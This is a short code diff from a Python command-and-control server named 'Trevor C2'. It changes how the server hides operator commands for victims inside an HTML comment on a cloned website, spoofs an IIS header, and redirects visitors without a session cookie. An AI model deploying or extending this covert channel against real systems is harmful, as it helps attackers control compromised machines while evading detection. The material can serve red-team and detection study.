@@ -251,16 +251,19 @@ class RPQ(tornado.web.RequestHandler):
         log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
         site_data = open("clone_site/index.html", "r").read()
+        # if we get assigned a cookie value or not
+        cookie_value = 0
         if self.get_cookie(COOKIE_SESSIONID_STRING):
             sid = self.get_cookie(COOKIE_SESSIONID_STRING)
             instructions = instructionsdict[sid]
+            cookie_value = 1
         else:
             instructions = ("")
             print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))
 
         # If we want to redirect them to the site we cloned instead of showing them a cloned copy of the site
-        if REDIRECT.lower() == ("on"):
-            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        if REDIRECT.lower() == ("on") and cookie_value == 0:
+                self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
         else:
             site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
             self.write(str(site_data))
@@ -283,7 +286,6 @@ class RPQ(tornado.web.RequestHandler):
 
 class SPQ(tornado.web.RequestHandler):
     """Output IP address and close."""
-
     def get(self):
         """Get Handler."""
         x_real_ip = self.request.headers.get("X-Forwarded-For")
@@ -403,7 +405,6 @@ if __name__ == "__main__":
     PYTHONVER = sys.version_info[0]
     print('[*] Starting Trevor C2 Server...')
     threading.Thread(target=main_c2).start()
-
     print("[*] Next, enter the command you want the victim to execute.")
     print("[*] Client uses random intervals, this may take a few.")
     print("[*] Type help for usage. Example commands, list, interact.\n")
